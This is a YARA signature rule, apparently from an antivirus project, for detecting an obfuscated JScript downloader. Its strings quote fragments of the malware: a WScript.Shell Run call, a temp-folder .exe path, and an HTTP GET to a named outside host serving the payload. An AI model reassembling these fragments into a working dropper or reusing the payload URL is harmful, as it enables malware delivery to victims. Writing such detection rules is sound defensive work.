rule sig_20160328_28ad30ef889acaf83ada311eb73dffaf {
  meta:
    description = "datamaliciousorder - file 20160328_28ad30ef889acaf83ada311eb73dffaf.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "7eeff2032696bc11247053a29e7c96aa497de8d336ef237a9f5a698e1c61dcca"

  strings:
    $s1  = "function Ufcbpgltpp() {return Yqasuhsoof[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"j4KQb9GE.exe\";};" fullword ascii
    $s2  = "Nzrydrdkj[Xavdn](\"GET\", \"http://santhiyasreetrading.com/j5ysdla\", false);" fullword ascii
    $s3  = "do {WScript[Sjrlg](Nmftcsytrt() * 11)} while (Nzrydrdkj[\"readystate\"] < 2 * 2);" fullword ascii
    $s4  = "function Uudbnkeb(Pzchac, Gpheiwtgae){return Pzchac - Gpheiwtgae;};" fullword ascii
    $s5  = "var Yqasuhsoof = function Okfgy() {return WScript[Scfvkx](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Aijrh(Hadbnwx){Yqasuhsoof[\"Run\"](Hadbnwx, Kzmrf, Kzmrf);};" fullword ascii
    $s7  = "function Jarxjgtr() {return ((Zakjxxswo == true) && (Zakjxxswo == Zbopncvwmi)) ? 1 : Kzmrf;};" fullword ascii
    $s8  = "function Mxbfuhdudk(){return Scfvkx;};" fullword ascii
    $s9  = "var Dvttas = new this[\"Date\"]();" fullword ascii
    $s10 = "function Bzhpypk(Sygedupq) {var Iktoywqj = (1, 2, 3, 4, 5, Sygedupq); return Iktoywqj;};" fullword ascii
    $s11 = "return Uudbnkeb(Fbeeg, Tryskxaax);" fullword ascii
    $s12 = "function Nmftcsytrt(){return 22;};" fullword ascii
    $s13 = "function Cephhtd()" fullword ascii
    $s14 = "var Zakjxxswo = false;" fullword ascii
    $s15 = "function Euphqeau(){return Ebdviq;};" fullword ascii
    $s16 = "Zbopncvwmi = true; " fullword ascii
    $s17 = "Zakjxxswo = true; " fullword ascii
    $s18 = "var Wutdakxct = false;" fullword ascii
    $s19 = "var Zbopncvwmi = false;" fullword ascii
    $s20 = " while (Eqxju){" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}